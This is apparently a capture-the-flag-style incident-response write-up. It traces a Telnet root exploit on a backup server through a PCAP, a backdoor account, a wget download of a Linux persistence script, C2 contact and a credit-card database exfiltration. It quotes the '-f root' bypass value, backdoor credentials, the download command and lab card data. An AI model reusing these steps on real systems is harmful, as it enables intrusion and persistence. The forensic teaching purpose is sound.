# Telly

## Scenario:

You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.

## Tools used:

- Wireshark
- DB Browser for SQLite

## Skills Learned:

- Network traffic analysis
- Detection of Telnet exploitation
- Credential and command extraction from PCAPs
- Identification of persistence mechanisms
- C2 communication analysis
- Data exfiltration detection and investigation
- File extraction and forensic analysis

## Investigation process:

I opened the file `monitoringservice_export_202610AM-11AM.pcapng` with Wireshark. I filtered the packets by the `Telnet` protocol.

In packet number 52, I found the `USER` environment variable being set with the value `-f root`. A quick search on Google revealed that `CVE-2026-24061` is associated with the vulnerability exploited in the Telnet protocol.

![Telnet packet showing USER environment variable set to "-f root"](./assets/01%20-%20user%20-f%20root.png)

In the same packet, I found the timestamp when the Telnet vulnerability was successfully exploited, granting the attacker remote root access on the target machine: `2026-01-27 10:39:28`

![Packet details showing timestamp of successful Telnet exploitation](./assets/02%20-%20timestamp.png)

To identify the hostname of the targeted server, I followed the TCP stream and searched for the login banner by typing `login` in the search box. This returned the kernel release/version and the hostname, which was `backup-secondary`.

![TCP stream output revealing target hostname "backup-secondary"](./assets/03%20-%20hostname%20of%20targeted%20server.png)

The attacker then created a backdoor account to maintain future access. To find it, I searched for the term `useradd`, which returned the username and password set for that account: `cleanupsvc:YouKnowWhoiam69`.

![Command showing creation of backdoor user with credentials](./assets/04%20-%20backdoor%20user%20password.png)

To find the full command the attacker used to download the persistence script, I tried several variants until the word `github` returned something interesting: the link `https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`. Scrolling up a little, I found that the packets immediately before contained one character each, forming `wget`. 

The full command used was: `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`.

![Reconstructed command downloading persistence script via wget](./assets/05%20-%20wget%20script.png)

Following the TCP stream, I found the C2 IP address the attacker used to install remote access persistence using the script: `91.99.25.54`.

![TCP stream showing attacker C2 IP address](./assets/06%20-%20c2%20ip%20address.png)

The attacker exfiltrated a sensitive database file. To identify it, I searched for the term `GET` which returned: `GET /credit-cards-25-blackfriday.db`

This is clearly an exfiltrated database, with the timestamp `2026-01-27 10:49:54`.

![HTTP GET request for exfiltrated database with timestamp](./assets/07%20-%20exfiltrated%20db%20timestamp.png)

Next, I analyzed the exfiltrated database. For compliance requirements, the organization must notify affected customers. For data validation purposes, we needed to find the credit card number for a customer named `Quinn Harris`.

I exported the database file using Wireshark’s **Export Objects** feature and opened it in **DB Browser for SQLite**.

I browsed the data for the name `Quinn Harris` which returned the client’s email: `quinn.harris@hotmail.com`.

![Quinn Harris email address](./assets/08%20-%20quinn%20harris%20email.png)

Using that email, I executed the following query: `SELECT * FROM purchases WHERE email = "quinn.harris@hotmail.com";` 

This returned the credit card number for Quinn Harris: `5312269047781209`.

![Database query result displaying credit card number](./assets/09%20-%20credit%20card%20number%20found.png)

## Conclusion:

The investigation confirmed that the attacker exploited a Telnet vulnerability to gain root access, established persistence through a backdoor account and external script, and successfully exfiltrated a sensitive database.